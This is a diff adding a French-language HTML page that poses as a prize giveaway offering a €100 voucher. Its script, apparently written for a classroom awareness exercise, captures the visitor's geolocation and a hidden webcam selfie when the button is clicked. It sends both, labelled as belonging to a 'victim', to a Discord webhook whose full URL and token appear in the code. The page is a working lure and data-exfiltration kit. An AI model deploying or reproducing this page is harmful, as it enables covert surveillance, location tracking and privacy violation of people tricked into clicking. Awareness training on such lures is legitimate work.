@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grand Jeu Concours !</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f8f9fa; }
+        .container { max-width: 500px; margin: auto; padding: 30px; border: 1px solid #dee2e6; border-radius: 10px; background-color: white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        button { padding: 12px 24px; font-size: 16px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #0056b3; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>🎉 Félicitations ! 🎉</h2>
+    <p>Vous avez été sélectionné pour gagner un bon d'achat d'une valeur de 100€.</p>
+    <p>Cliquez ci-dessous pour vérifier votre éligibilité et réclamer votre prix.</p>
+    <button onclick="lancerSensibilisation()">Vérifier mon gain</button>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+// ⚠️ METTEZ VOTRE WEBHOOK DISCORD ENTRE LES GUILLEMETS CI-DESSOUS :
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520406534859788341/EQl1mXNXoxVXLpK7UukYDVjmKJN--Q3hDZ1xSpQa8K2gL2yJ9pDEXECkwYbsZ_w1RJqG";
+
+function envoyerVersDiscord(message, imageBase64 = null) {
+    // Si on envoie juste du texte (localisation)
+    if (!imageBase64) {
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    } else {
+        // Si on envoie le selfie, Discord demande un format FormData pour les fichiers
+        const blob = dataURLtoBlob(imageBase64);
+        const formData = new FormData();
+        formData.append('content', message);
+        formData.append('file', blob, 'selfie.png');
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            body: formData
+        });
+    }
+}
+
+// Fonction utilitaire pour convertir l'image Base64 en fichier binaire (Blob)
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], {type:mime});
+}
+
+function lancerSensibilisation() {
+    // 1. Récupération de la localisation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let GoogleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            let msg = `📍 **Nouvelle victime piégée !**\n- Latitude : ${lat}\n- Longitude : ${lon}\n- Lien Maps : ${GoogleMapsLink}`;
+            envoyerVersDiscord(msg);
+        });
+    }
+
+    // 2. Capture du selfie
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(function() {
+                let canvas = document.getElementById('canvas');
+                let context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                let imageDataURL = canvas.toDataURL('image/png');
+                
+                // Fermer la caméra
+                stream.getTracks().forEach(track => track.stop());
+
+                // Envoyer la photo sur Discord
+                envoyerVersDiscord("📸 **Selfie de la victime :**", imageDataURL);
+                
+                // Redirection finale pour faire illusion ou afficher un message pédagogique
+                alert("Fin de la démonstration du TP. Vos données ont été transmises à votre binôme.");
+            }, 1000);
+        })
+        .catch(function(err) {
+            envoyerVersDiscord("❌ Caméra refusée par la victime.");
+        });
+    }
+}
+</script>
+
+</body>
+</html>
